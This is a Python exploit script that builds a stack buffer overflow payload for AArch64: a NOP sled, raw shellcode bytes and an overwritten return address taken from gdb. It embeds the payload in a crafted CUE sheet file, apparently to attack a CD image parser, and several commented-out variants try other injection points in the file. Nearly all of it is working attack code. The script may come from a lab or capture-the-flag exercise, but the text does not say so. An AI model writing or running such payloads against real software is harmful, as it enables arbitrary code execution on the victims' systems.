#!/usr/bin/env python3
import struct

BUF_ADDR   = 0xffffffffdd28     # from gdb
RET_ADDR   = BUF_ADDR + 0x200   # safe jump into NOP sled
OFFSET_LR  = 2128               # computed from gdb

shellcode = (
    b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2"
    b"\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa"
    b"\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2"
    b"\xe1\x66\x02\xd4"
)

nop = b"\x1f\x20\x03\xd5"      # 4-byte AArch64 nop
nop_sled = nop * 532           # 2000 bytes
#extra = b"B" * 1      # add exactly 2 bytes
#payload = nop_sled + extra + shellcode

payload = nop_sled + shellcode
payload = payload.ljust(OFFSET_LR, b"A")
payload += struct.pack("<Q", RET_ADDR)

with open("formats/cdfs/exploit.bin", "wb") as f:
    f.write(payload)
'''
with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)          # <--- RAW BYTES INSIDE QUOTES
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "A.ISO" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352 ;\n')
    f.write(b"X")              # MUST NOT BE '"' or '\x0a'
    f.write(payload)
    f.write(b"\nINDEX 01 00:00:00\n")

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "A.ISO" BINARY ;')
    f.write(payload)
    f.write(b'\nTRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "A.ISO" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352 "X')
    f.write(payload)
    f.write(b'"\n')
    f.write(b'  INDEX 01 00:00:00\n')

'''
with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)            # PAYLOAD MUST GO HERE
    f.write(b'" BINARY\n')

    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

